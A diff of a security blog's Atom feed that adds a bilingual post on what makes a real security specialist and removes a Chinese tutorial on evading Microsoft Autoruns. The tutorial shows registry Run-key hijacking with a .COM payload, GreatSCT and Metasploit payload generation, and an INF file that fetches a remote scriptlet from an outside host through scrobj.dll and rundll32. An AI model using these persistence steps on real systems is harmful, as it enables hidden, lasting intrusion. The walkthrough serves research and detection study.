@@ -1,4 +1,84 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="https://security-onigiri.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://security-onigiri.github.io//" rel="alternate" type="text/html" /><updated>2018-04-18T14:34:22+08:00</updated><id>https://security-onigiri.github.io//</id><entry><title type="html">沒有RCE？那就直接SSH進去啊！</title><link href="https://security-onigiri.github.io//2018/04/18/rcessh.html" rel="alternate" type="text/html" title="沒有RCE？那就直接SSH進去啊！" /><published>2018-04-18T00:00:00+08:00</published><updated>2018-04-18T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/04/18/rcessh</id><content type="html" xml:base="https://security-onigiri.github.io//2018/04/18/rcessh.html">&lt;p&gt;&lt;del&gt;何不食肉糜?&lt;/del&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.1">Jekyll</generator><link href="https://security-onigiri.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://security-onigiri.github.io//" rel="alternate" type="text/html" /><updated>2018-05-08T13:49:04+08:00</updated><id>https://security-onigiri.github.io//</id><entry><title type="html">你不算個資安專家，如果你只是…</title><link href="https://security-onigiri.github.io//2018/05/08/you-are-not-a-security-specialist-if-you.html" rel="alternate" type="text/html" title="你不算個資安專家，如果你只是..." /><published>2018-05-08T00:00:00+08:00</published><updated>2018-05-08T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/05/08/you-are-not-a-security-specialist-if-you</id><content type="html" xml:base="https://security-onigiri.github.io//2018/05/08/you-are-not-a-security-specialist-if-you.html">&lt;h1 id=&quot;well-you-are-not-a-security-specialist-if-you-&quot;&gt;Well, you are not a “Security Specialist” if you …&lt;/h1&gt;
+
+&lt;p&gt;Starting this thread is easy …&lt;/p&gt;
+
+&lt;p&gt;I spotted many of people nowadays claimed that they are an “InfoSec Specialist” on their resume, Linkedin profile, etc. This will eventually makes life a bit more difficult for the HR personnel or inexperience hiring managers that are genuinely looking for a real-deal InfoSec Specialist to fill certain specifi job roles.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;用講的很簡單 …&lt;/p&gt;
+
+  &lt;p&gt;我發現現在很多人在他們的履歷、Linkedin 專頁等等，宣稱自己是”資安專家”。這只是在為難想找真正的專家來填補工作空缺的那些 HR 或人事經理人們而已。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So, here are things that separate them from the real specialists and experts out there. See if you may be considered into one of them (inadvertently or deliberately):&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;所以，這裡是一些可以用來區分他們是否為真正的專家，或是熟捻相關事務的從業人員，或許你會想考慮其中一個職業（不小心或蓄意的）。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You are not a Pentesting/Ethical Hacking Specialist if your day to day job just utilzing some tools to look for vulnerability such as Qualys, Nessus, OpenVAS, Nikto, Acunetix, and alike. We called these tools: Automated Vulnerability Scanners and using one of them does not makes you a Hacker or Pentester Specialist. To makes you a real Pentester, you need to be able to break into the systems manually and be able to gain root/administrator privileges on that system you are breaking (in which pratically allowed you to do anything you wanted with that compromised system). Alternatively you should be able to demonstrate the capability to ex-filtrate any sensitive information out from its protected repositories even if you only given a standard user privilege access to that system.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;你不算是一個專業&lt;strong&gt;滲透測試/道德駭客&lt;/strong&gt;，如果你每天的工作內容都是，使用類似 Qualys、Nessus、OpenVAS、Nikto、Acunetix 之類的工具尋找弱點。我們稱這些工具為：自動化弱點掃描器，使用其中一個工具並不會讓你變成駭客或是滲透測試專家。想當一個真正的滲透測試者，你需要要能手動侵入一個系統並且獲得該系統的管理員權限（表示在那被攻陷的系統上你可以為所欲為）。或是你應該能展示出從一個被保護的存放處洩漏出敏感資訊的能力，甚至你只有被給予一個該系統上一般的使用者權限。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You are not a Malware Reverse Engineering Specialist if what you are doing simply googling the executable filenames or its MD5 hashes and look it up at VirusTotal or take that executables and run it into the Automated Malware Sandbox Analyzer such as Cuckoo, VT, Malwr, GFI, etc. to be called a real Malware Revese Engineering Specialist, you should be able to perform surgical of the malicious binary files using Hex Editor, Debugger and Disassembler and MOST IMPORTANTLY to be able to decode, de-obfuscate and probaly decrypt the codes and login behind the binary file and locate in which part of the code’s sub-routine that is/are doing evil as to validate if the binary is truly malicious.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;你不算是一個專業&lt;strong&gt;惡意程式逆向工程師&lt;/strong&gt;，如果你只是簡單的 google 執行檔的名稱或是他的 MD5 雜湊並在 VirusTotal 搜尋它，或是丟到 Cuckoo、VT、Malwr、GFI 等等的自動化惡意程式沙盒分析工具。要想成為一個真正的惡意程式逆向工程專家，你應該要能使用&lt;em&gt;十六進位編輯器&lt;/em&gt;、&lt;em&gt;除錯器&lt;/em&gt;、&lt;em&gt;反組譯器&lt;/em&gt;剖析惡意程式二進位檔案，還有&lt;strong&gt;最重要的是&lt;/strong&gt;可以解碼、解混淆並正確的解密程式碼，並且定位到執行惡意行為的程式區段，如果它是真的惡意程式的話。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You are not a Cyber Threat Intelligent Specialist if what you do is just to read and forward InfoSec news to your bosses/IT Team without having a proper method on how to dissect, filter and process that information into a valuable intelligence that are useful for your organization in term of how to provide early detection, prevent and deter the cyber attack or casualties from arising or happening to your ogranization.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;你不算是一個&lt;strong&gt;網路威脅情資專家&lt;/strong&gt;，如果你只是純粹讀一讀資安新聞，或是轉發資安新聞給你老闆/IT 團隊。在危害發生前，你需要提供一個適切的方法來處理該資訊成為對你的組織有價值的情資，以達到早先偵測、避免與阻斷網路攻擊的目的。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You are not a Network Attack/DDoS Mitigator Specialist if what you do is merely to have your inbound internet link traffics routed behind a DDoS Scrubbing Provider (like Prolexic/Akamai, Verisign, Incapsula, etc) and you were involved to any DDoS attack events just because you were being called /paged-out by oyur DDoS cloud provider to joined their bridgeline and listening to what they are doing over the phone. To be called a specialist in this field, you need to know how exactly the Network/DDoS attacks coming to your network: the attack vectors, methods, protocols being abused, types of attacks, what is the mitigation control you have in-premise and on-the-cloud, when and what mitigations to activate, etc. You need to be proficient in reading and understand the underlying of packet captures and you also need to know how to build and enhance your defense posture to adapt with the ever increasing attack methods being launch and seen to-date.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;你不算是一個&lt;strong&gt;網路攻擊/分散式阻絕緩解專家&lt;/strong&gt;，如果你只是修改路由將網際網路的輸入流量轉接到 DDoS 流量清洗商(例:Prolexic/Akamai, Verisign, Incapsula…)或只從鍵盤參與或是與你的 DDoS 流量清洗商用電話溝通加入他們的實況轉播。
+這方面的專業人士必須真正了解網路與 DDoS 攻擊 是如何進入你的網路，例如: 清楚攻擊向量、方式、使用的通訊協定、攻擊類型，地端與雲端可用的緩解方案，緩解方案的啟動時機。
+舉例來說，你必須熟悉如何獲取封包並且能夠閱讀內容，同時你必須能夠建立並加強自己的防禦機制去解決與日俱增的攻擊方式和現今正在發生的攻擊。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You are not Security Event Management Specialist if what you do is just to received event alerts from your IDSes or Log alerting/correclation tools (such as Splunk, ArcSight ESM, etc) and escalate this alerts to your security vendor whom job function is simply doing Level-1 of event forwarding blindly to the proper team. In order to makes you a real Security Event Management Specialist, you need to be able to do some basic analysis of the events and to determine which ones are real events and which ones are false positive. You also needs to have capability to filter out and reduced any false positives by tuning the SIEM system you have access to.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;你不算是一個&lt;strong&gt;資安事件管理專家&lt;/strong&gt;，如果你只是從你的入侵偵測系統(IDS)收警告或日誌告警/關聯工具 (諸如：Splunk、ArcSight ESM 等)並將告警呈報給你的資安供應商，這種初級且簡單到可以矇眼轉送的工作。為了成為一個正港的資安事件管理職人，你需要能實作初步的分析判斷哪些是誤報，哪些是真正的告警。你也需要會調校你的 SIEM 系統以達到過濾及減少誤報。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You are not Security Intrusion Analyst/Specialist if you are simply doing the above job roles of Security Event Management Specialist. To makes you a real deal Seucrity Intrusion Analyst/Specialist, you need to be able to read inside packet capture and tell us on the spot of what is it raelly happening on any particular events. You also will need to be able to perform a holistic analysis even in the case where full packet capture is not available and you need to rely on other means likes system/proxy/firewall/network logs etc.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;你不能算是正港的&lt;strong&gt;資安入侵分析師/專家&lt;/strong&gt;，如果你只是做一些上面提到資安事件管理專家做的事情。要想當個真真正正的資安入侵分析師/專家，你需要有透過封包分析並告訴我們目前到底發生了什麼事情。同時也要在封包收錄不足的情況下，佐以系統/代理伺服器/防火牆/網路日誌等等，做到一個完整的解析說明。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You are not a Computer Forensic Specialist if what you konw is just to check the system logs from any error message and to run anti-virus software to find out whether or not the system is infected by viruses. To be called a Computer Forensics Specialist, you need to be able to perform proper data acquisition of the evidence from HDD or any other storage, to preserve it well and ensure it is adminssible to the court during trials, to be able to dig deeper down to the file system level of different OSes to find out artifacts of events being investigate, detecting and recovering deleted files from slack spaces and even to recover evidence from volume shadow copies, registry entries, prefetch data, etc. You also need to be proficient with handling volatile memory, know how to acquire them as well as to find malicious code could possibly hiding into other legitimate process(es) via process hollowing, etc.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;你不能算是一個&lt;strong&gt;計算機鑑識專家&lt;/strong&gt;，如果你只是看看系統日誌的錯誤訊息，並運行防毒軟體來確認是否有感染跡象。要想當個 real 的計算機鑑識專家，你要會從 HDD 或其他存儲裝置獲取恰當的跡證資料，並將之保存得當並確定這是可以在審訊中做為依據的。要能深入不同作業系統上的檔案系統層級，去找尋正在調查的人為事件、偵測並從殘餘空間復原被刪除的檔案，甚至從 volume shadow 拷貝、註冊表、prefetch file 等等來復原證據，你也需要專業到可以處理揮發性記憶體，知道如何從中取得可能存在合法形成中的惡意程式碼。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Hope this article could provide some insight to any HR practitioner specializing in InfoSec recruitment or to any hiring managers that are truly looking for a better (if not one of the best) InfoSec Specilists out there to perform a real challenging jobs that required their true expertise of their respective fields.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;希望這個文章可以讓與資安相關的 HR 從業人員或人事經理多了解一點，在資安相關工作雇用上可以找到好一點的(如果不是要最好的)資安專家，來實踐一些真正需要他們專業及屌炸天的技能來應付的挑戰。&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name>jhe</name></author><summary type="html">Well, you are not a “Security Specialist” if you …</summary></entry><entry><title type="html">沒有RCE？那就直接SSH進去啊！</title><link href="https://security-onigiri.github.io//2018/04/18/rcessh.html" rel="alternate" type="text/html" title="沒有RCE？那就直接SSH進去啊！" /><published>2018-04-18T00:00:00+08:00</published><updated>2018-04-18T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/04/18/rcessh</id><content type="html" xml:base="https://security-onigiri.github.io//2018/04/18/rcessh.html">&lt;p&gt;&lt;del&gt;何不食肉糜?&lt;/del&gt;&lt;/p&gt;
 
 &lt;p&gt;[&lt;img src=&quot;http://blog.jr0ch17.com/images/2017-11-08_12h39_35.png&quot; alt=&quot;My Profile Photo&quot; /&gt;&lt;/p&gt;
 
@@ -2090,434 +2170,4 @@ const { JSDOM } = require(‘jsdom’);&lt;/p&gt;
 
 &lt;p&gt;我發布的這條推文頗受歡迎，並引發了包括&lt;a href=&quot;https://twitter.com/cchuatl&quot;&gt;@cchuatl&lt;/a&gt;，&lt;a href=&quot;https://twitter.com/albinowax&quot;&gt;@albinowax&lt;/a&gt;和&lt;a href=&quot;https://twitter.com/einaros&quot;&gt;@einaros&lt;/a&gt;在內的好幾個人私訊我有趣的後續意見。該流程的關鍵之一即是該pingback來自很可能非常靠近主機伺服器DNS解析伺服器，但並不一定如此。而這個想法始終存在我的腦海中，這也就是為什麼我使用“關聯”而不是“擁有”的說法，但這方法絕對能夠增加隱藏地址的清晰度。&lt;/p&gt;
 
-&lt;p&gt;更多像我此次提出的反饋正是使資安社群成為更為美好聚集地的一部分。我的目標是不公開任何人的.onion服務，這就是為什麼我清理了所有的屏幕截圖，但在上述截圖情況應非實際位址，但根據網站的內容以及解析器分析的IP地址與我預計的託管位置其實是內聯的，所以我相信它非常接近主機伺服器了。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="forensics" /><summary type="html">發佈於2017年11月23日</summary></entry><entry><title type="html">繞過微軟的AutoRuns</title><link href="https://security-onigiri.github.io//2018/01/29/autoruns.html" rel="alternate" type="text/html" title="繞過微軟的AutoRuns" /><published>2018-01-29T00:00:00+08:00</published><updated>2018-01-29T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/01/29/autoruns</id><content type="html" xml:base="https://security-onigiri.github.io//2018/01/29/autoruns.html">&lt;table&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;by lopi&lt;/td&gt;
-      &lt;td&gt;2017年10月25日發布&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;&lt;strong&gt;事件背景&lt;/strong&gt;
-在DerbyCon 7.0上，Chris Bisnett和Kyle Hanslovan聯合發表了一個名為 “Evading Autoruns” 的演講。Kyle和Chris展示了 “繞過” 微軟Sysinternals “Autoruns” 工具的能力。他們主要利用 “PATHEXT” Windows環境變量以及本機上有Microsoft簽章的可執行文件來執行運行註冊表項獲得持久性。在此強烈建議讀者觀看他們的演講，這些傢伙的腦洞真不知道怎麼開的(讚嘆語氣)。以下是Kyle和Chris發表的所有內容。&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=AEmuhCwFL5I&amp;amp;feature=youtu.be&quot;&gt;Talk&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/huntresslabs/evading-autoruns/raw/master/Evading_Autoruns_Slides.pdf&quot;&gt;Slides&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/huntresslabs/evading-autoruns/blob/master/pocs.bat&quot;&gt;PoC&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf&quot;&gt;Example “shady” INF&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/huntresslabs/evading-autoruns&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;繞過autoruns的摘要&quot;&gt;&lt;strong&gt;“繞過Autoruns”的摘要&lt;/strong&gt;&lt;/h1&gt;
-&lt;p&gt;當涉及到入侵攻擊時，最關鍵的即是對端點的訪問權限的維護。對於防禦者來說，在網路中發掘這些基點同樣重要。在此次的演講中，Kyle和Chris將揭露幾種用來迴避最常見持久性枚舉工具的半公開以及私有技術。他們的技術將探取重新創建運行密鑰的方法、非常規地濫用搜索序列並利用具可信度的應用程式。為了補充並解釋他們的技術，每個yoyodiy(繞過)都將包括現場演示以及檢測建議。&lt;/p&gt;
-
-&lt;h1 id=&quot;冒險啟程&quot;&gt;&lt;strong&gt;冒險啟程&lt;/strong&gt;&lt;/h1&gt;
-&lt;p&gt;現在我們已經重新審視了所有的演講釋出素材，其中包括觀看演講影片，現在讓我們來深入探討這個演講中有趣的技術內容。我們的目標是獲得Kyle和Chris演講中詳細描述的四種技巧。我們將要實作出來以試圖充分理解此研究並將其應用到實務中。&lt;/p&gt;
-
-&lt;h1 id=&quot;擴展搜索順序自動運行技術&quot;&gt;&lt;strong&gt;擴展搜索順序自動運行技術&lt;/strong&gt;&lt;/h1&gt;
-&lt;p&gt;在第68頁投影片上，我們看到一個有趣的陳述內容。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/uto8fQl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;我所在意的部分即是上面被我用紅框標示的部分。這隻字片語立刻讓我想起了Windows上的“PATHEXT”環境變量。我繼續閱讀下面幾頁的投影片，以確保我了解搜索序列的工作原理，然後看到下面這頁的投影片。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6q6zBxM.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;如果我解讀正確無誤的話，PATHEXT環境變量會在搜尋’.EXE’之前先尋找’.COM’擴展名(副檔名)。而下一張投影片正好為我們驗證了這一點。這項研究讓我想起了Derbycon 3.0中Christopher Campbell and Matt Graeber的“&lt;a href=&quot;https://www.youtube.com/watch?v=j-r6UonEkUw&quot;&gt;Living Off the Land&lt;/a&gt;”的演講。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/cTCHRTG.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;好了~我們現在知道搜索順序是如何工作的。理論是，如果我們修改一個現有的註冊表項，我們應該能夠載入一個’.COM’而不是’.EXE’，因為搜索序列會先查找’.COM’擴展名。它正是利用Windows的工作原理，在我上面簡要提到的 “&lt;a href=&quot;https://www.youtube.com/watch?v=j-r6UonEkUw&quot;&gt;Living Off the Land&lt;/a&gt;” 亦有闡述相關理念。接著讓我們繼續檢視他們的投影片。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/dAyJe0C.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;看起來這是在Windows 10上的Windows Defender的註冊表項。我想我們必須修改此註冊表項的值從 “C:\Program Files\Windows Defender\MSASCuiL.exe” 到 “C:\Program Files\Windows Defender\MSASCuiL” 並將’.COM’文件放在同一個目錄中。讓我們來驗證我們是否完全理解他們正在解釋什麼以繼續驗證這投影片的內容。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/MqTabH8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;不賴嘛~我們似乎完全理解正確。現在讓我們確保他們有將’.COM’文件添加到同一個目錄中。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/nkI6ca2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;哼哼~我根本先知。他們的所作所為皆如我所料。但我想知道這在AutoRuns程式中是什麼樣子呢？&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/hiaiTWq.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;天啊！這autoruns繞過思路真是太猥瑣了，這樣我都不知道要怎麼教我小孩子了&amp;gt;&amp;lt;
-你看看他們新添加的’.COM’文件發布者正是 “Microsoft Corporation” 欸？也太糟糕了吧。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/YmRxyYl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;現在我們了解了“擴展名搜索序列”是如何運作的，接著讓我們在Windows 7和Windows 10上來嘗試一下。首先，我將使用我開發的一個名為“&lt;a href=&quot;https://github.com/GreatSCT/GreatSCT&quot;&gt;GreatSCT”(Great Scott&lt;/a&gt;)的工具來生成一個COM腳本Payload。使用我的工具生成COM腳本的要求是環境擁有&lt;a href=&quot;https://www.python.org/downloads/&quot;&gt;Python3&lt;/a&gt;和&lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit&lt;/a&gt;。有了我們生成的Payload，我們需要再目標系統上安裝Microsoft Excel來讓它能正常運作。如果你想更快速的流程，你可以&lt;a href=&quot;https://gist.github.com/subTee/802f6a9ebce79b27b8671fbab86da702&quot;&gt;在這&lt;/a&gt;取得資源以嘗試一下Casey Smith（&lt;a href=&quot;https://twitter.com/subTee&quot;&gt;@subtee&lt;/a&gt;）的以calc.exe證明這個極簡主義COM scriptlet的概念。&lt;/p&gt;
-
-&lt;p&gt;git clone https://github.com/GreatSCT/GreatSCT
-python3 gr8sct.py&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/UCsR35D.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;你會看到下面的提示。按任意鍵開始。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/YTUDUoY.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;我們將使用“SCT/regsvr32.cfg”的選項。輸入相關的號碼，然後按Enter。您可以通過使用Tab來完成並鍵入“set ListenerPort 80”作為示例來設置選項。以下是我如何為我們的“擴展名搜索序列”測試範例配置Payload。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/u9EyWdr.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;請注意我如何將輸出位置設置為“MSASCuiL.com”。接著輸入generate並按enter。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jbAnb0q.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;現在我們已經生成了一個COM Payload，我們可以用以測試出“擴展名搜索序列”的技術。讓我們啟動安裝了Excel的Windows 7虛擬機。第一步，讓我們先修改Windows Defender註冊表項。&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;HKLM \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Run \ SecurityHealth（REG_EXPAND_SZ） - C：\ Program Files \ Windows Defender \ MSASCui&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ZEedJ0b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;將你生成的COM Payload命名為“MSASCui.com”放在C:\Program Files\Windows Defender\&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/8fRrTLC.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;讓我們啟動我們的Metasploit監聽器。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/f69aL3p.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;重新啟動我們的Windows 7虛擬機並等待其返還shell。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Fn5ABaQ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;It Work！有關Windows 10的詳細內容，請參閱下面的部分教程。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/bhlS6tk.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;squiblydoo-inf自動運行技術&quot;&gt;&lt;strong&gt;Squiblydoo INF自動運行技術&lt;/strong&gt;&lt;/h1&gt;
-&lt;p&gt;首先，讓我們回顧Casey Smith（&lt;a href=&quot;https://twitter.com/subTee&quot;&gt;@subtee&lt;/a&gt;）的“regsvr32.exe” a.k.a. “Squilydoo”。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6DKONHN.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;這是防禦者的反應&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/MiI5cAj.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Chris和Kyle在MSDN文件上發現了以下有關“INF”的內容。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/QWE9vMQ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;我很好奇。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/RA6sx9W.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;我不知道我們是否可以將其使用在“regsvr32.exe”或“rundll32.exe”上。讓我們繼續看他們的投影片，看看是否有一個“INF”文件的範例。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/fyB9gAk.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;好，很棒。但是這是如何運作的呢？語法看起來似曾相識，也許他們將使用“rundll32.exe”而不是“regsvr32.exe”。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/33cFHwU.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;沒有錯啦~
-我們可以藉由“INF”文件來使用“rundll32.exe”。讓我們確認我們在嘗試之前已獲取所有我們需要的訊息資源。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jJmmpQ6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;所以我們可以使用“rundll32.exe”和“INF”文件來代替“regsvr32.exe”。這相當乾淨俐落，但不幸的是，它不是安全運作方式，你可以在前面他們的談話投影片中看到。這並不完全是我所希望的結果，但這值得探討。我將使用我在之前文章中使用GreatSCT生成的COM scriptlet Payload。您也可以在&lt;a href=&quot;https://gist.github.com/subTee/802f6a9ebce79b27b8671fbab86da702&quot;&gt;這裡&lt;/a&gt;使用Casey Smith（&lt;a href=&quot;https://twitter.com/subTee&quot;&gt;@subtee&lt;/a&gt;）的以calc.exe證明這個極簡主義COM scriptlet的概念。現在讓我們修改它所提供的“shady.inf”。&lt;/p&gt;
-
-&lt;p&gt;; ———————————————————————-
-; Required Sections
-; ———————————————————————-
-[Version]
-Signature=$ CHICAGO $
-Provider=test
-Class=Printer&lt;/p&gt;
-
-&lt;p&gt;[Manufacturer]
-HuntressLabs=ModelsSection,NTx86,NTia64,NTamd64&lt;/p&gt;
-
-&lt;p&gt;; ———————————————————————-
-; Models Section
-; ———————————————————————-
-[ModelsSection.NTx86]
-UnregisterDlls = Squiblydoo&lt;/p&gt;
-
-&lt;p&gt;[ModelsSection.NTia64]
-UnregisterDlls = Squiblydoo&lt;/p&gt;
-
-&lt;p&gt;[ModelsSection.NTamd64]
-UnregisterDlls = Squiblydoo&lt;/p&gt;
-
-&lt;p&gt;; ———————————————————————-
-; Support Sections
-; ———————————————————————-
-[DefaultInstall]
-UnregisterDlls = Squiblydoo&lt;/p&gt;
-
-&lt;p&gt;[Squiblydoo]
-11,,scrobj.dll,2,60,https://blog.conscioushacker.io/testaroo.sct&lt;/p&gt;
-
-&lt;p&gt;我將把它放在我的桌面上，並稱之為“testaroo.inf”。我還在我的Blog上託管了COM scriptlet payload。下一步是創建一個註冊表項。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/HenWxrG.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;我的metasploit監聽器仍在運行，所以我們要做的只是重啟Windows 7虛擬機並等待它返還我們要的shell。不幸的是，我沒有得到任何shell，所以我打開Process Hacker來看看發生了什麼事。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/1INwldO.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;我們的流程樹中的“rundll32.exe”在哪裡？我怎麼都找不到欸？為了簡化本節論述，我嘗試在Windows 7和Windows 10上使用HKLM和HKCU。但我仍無法使用autoruns註冊表項工作，但是，在Windows 7上手動執行“rundll32.exe setupapi,InstallHinfSection ModelsSection 128 C:\Users\lopi\Desktop\testaroo.inf”時，它倒是正常運作了。我嘗試使用前面提到的calc.exe概念證明。 Chris和Kyle在談話中並沒有提到Windows 10要求驅動程序擁有合法簽名，以便在沒有用戶提示的情況下進行安裝。在這一點上，我決定停深入探討這個。&lt;/p&gt;
-
-&lt;h1 id=&quot;infdefaultinstallexe自動運行技術&quot;&gt;&lt;strong&gt;InfDefaultInstall.exe自動運行技術&lt;/strong&gt;&lt;/h1&gt;
-&lt;p&gt;進入下一個技術，“InfDefaultInstall.exe”。讓我們馬上開始吧？&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/2dTJ9w8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;好的，我們可以使用“InfDefaulInstall.exe”而不是“rundll32.exe”，並用與以前一樣的方法使用它。讓我們啟動我們的Windows 10虛擬機，看看我們是否有相同的數位簽章以及UAC提示“InfDefaultInstall.exe”。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Vy5bGFs.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
